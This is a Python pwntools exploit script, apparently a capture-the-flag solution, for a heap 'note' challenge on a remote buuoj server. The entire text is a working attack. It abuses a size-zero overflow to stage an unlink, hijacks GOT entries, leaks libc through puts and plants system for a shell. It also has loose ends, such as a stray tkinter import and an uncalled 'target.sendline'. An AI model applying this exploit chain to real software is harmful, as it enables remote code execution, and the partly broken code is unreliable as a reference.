from tkinter.ttk import Notebook
from pwn import *
from LibcSearcher import *

context.log_level = 'debug'
context.arch = 'amd64'

target = remote('node4.buuoj.cn', 27038)
libc = ELF('/home/kali/glibc-all-in-one/libs/2.23-amd64/libc-2.23.so')

'''
cur_ptr:

ptr:

size:
'''

note_bss = 0x6020C8
note2_offset = note_bss + 0x10
# Unlink: make free_got => printf
puts_plt = 0x400730
free_got = 0x602018
atoi_got = 0x602070


def new(length, content):
    target.sendlineafter('option--->>', b'1')
    target.sendlineafter('1024)', str(length))
    target.sendlineafter('content:', content)


def edit(id, content):
    target.sendlineafter('option--->>', b'3')
    target.sendlineafter('note:', str(id))
    target.sendlineafter('content:', content)


def delete(id):
    target.sendlineafter('option--->>', b'4')
    target.sendlineafter('note:', str(id))


# size - 1 > i. if size = 0. 0 - 1 > i causes overflow.
new(0x0, b'')
new(0x100, b'a')
new(0x100, b'a')
new(0x100, b'a')

# Fake chunk in chunk 2' body and chunk 3' header is modified.
payload = p64(0) * 3 + p64(0x121) + b'a' * 0x110
payload += p64(0) + p64(0x101) + p64(note2_offset - 0x18) + \
    p64(note2_offset - 0x10) + b'a' * (0x100 - 0x20)
payload += p64(0x100) + p64(0x110)

edit(0, payload)  # cur_ptr = 0.
delete(1)  # note 2 => cur_ptr

payload = b'a' * 0x8 + p64(free_got) + p64(atoi_got) + \
    p64(atoi_got) + p64(atoi_got)
edit(2, payload)
# Now, notes become got.
# Note that `read` function reads the higher bit into the lower position.
edit(0, p64(puts_plt)[:-1])
# Now, free becomes puts.
delete(2)
atoi_addr = u64(target.recvuntil(b'\x7f')[-6:].ljust(0x8, b'\x00'))
print(hex(atoi_addr))
libc_base = atoi_addr - libc.sym['atoi']
system_addr = libc_base + libc.sym['system']

edit(3, p64(system_addr)[:-1])
target.sendline
target.interactive()
